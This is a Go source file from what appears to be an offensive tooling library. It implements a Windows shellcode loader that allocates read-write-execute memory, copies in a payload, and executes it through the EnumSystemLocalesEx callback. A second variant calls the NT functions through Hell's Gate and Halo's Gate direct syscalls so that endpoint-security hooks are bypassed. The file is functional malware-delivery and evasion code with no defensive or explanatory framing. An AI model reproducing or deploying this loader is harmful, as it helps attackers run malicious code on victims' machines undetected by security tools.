package shellcode

import (
	"unsafe"
	"golang.org/x/sys/windows"
  "github.com/D3Ext/Hooka/evasion"
)

func EnumSystemLocales(shellcode []byte) error {
  kernel32 := windows.NewLazyDLL("kernel32.dll")
  ntdll := windows.NewLazyDLL("ntdll.dll")

  EnumSystemLocalesEx := kernel32.NewProc("EnumSystemLocalesEx")
  NtAllocateVirtualMemory := ntdll.NewProc("NtAllocateVirtualMemory")
  NtWriteVirtualMemory := ntdll.NewProc("NtWriteVirtualMemory")

  var addr uintptr
  regionsize := uintptr(len(shellcode))

  r1, _, err := NtAllocateVirtualMemory.Call(^uintptr(0), uintptr(unsafe.Pointer(&addr)), 0, uintptr(unsafe.Pointer(&regionsize)), windows.MEM_COMMIT|windows.MEM_RESERVE, windows.PAGE_EXECUTE_READWRITE)
  if r1 != 0 {
    return err
  }

  NtWriteVirtualMemory.Call(^uintptr(0), addr, uintptr(unsafe.Pointer(&shellcode[0])), uintptr(len(shellcode)), 0)

  r1, _, err = EnumSystemLocalesEx.Call(addr, 0, 0, 0)
  if r1 == 0 {
    return err
  }

	return nil
}

/*

Hell's Gate + Halo's Gate technique

*/

func EnumSystemLocalesHalos(shellcode []byte) error {
	kernel32 := windows.NewLazyDLL("kernel32.dll")
	GetCurrentProcess := kernel32.NewProc("GetCurrentProcess")
	EnumSystemLocalesEx := kernel32.NewProc("EnumSystemLocalesEx")

	NtAllocateVirtualMemory, err := evasion.GetSysId("NtAllocateVirtualMemory")
	if err != nil {
		return err
	}

	NtWriteVirtualMemory, err := evasion.GetSysId("NtWriteVirtualMemory")
	if err != nil {
		return err
	}

	pHandle, _, _ := GetCurrentProcess.Call()

	var addr uintptr
	regionsize := uintptr(len(shellcode))

	r1, err := evasion.Syscall(
		NtAllocateVirtualMemory,
		uintptr(pHandle),
		uintptr(unsafe.Pointer(&addr)),
		0,
		uintptr(unsafe.Pointer(&regionsize)),
		windows.MEM_COMMIT|windows.MEM_RESERVE,
		windows.PAGE_EXECUTE_READWRITE,
	)

	if r1 != 0 {
		return err
	}

	evasion.Syscall(
		NtWriteVirtualMemory,
		uintptr(pHandle),
		addr,
		uintptr(unsafe.Pointer(&shellcode[0])),
		uintptr(len(shellcode)),
		0,
	)

	EnumSystemLocalesEx.Call(
		addr,
		0,
		0,
		0,
	)

	return nil
}
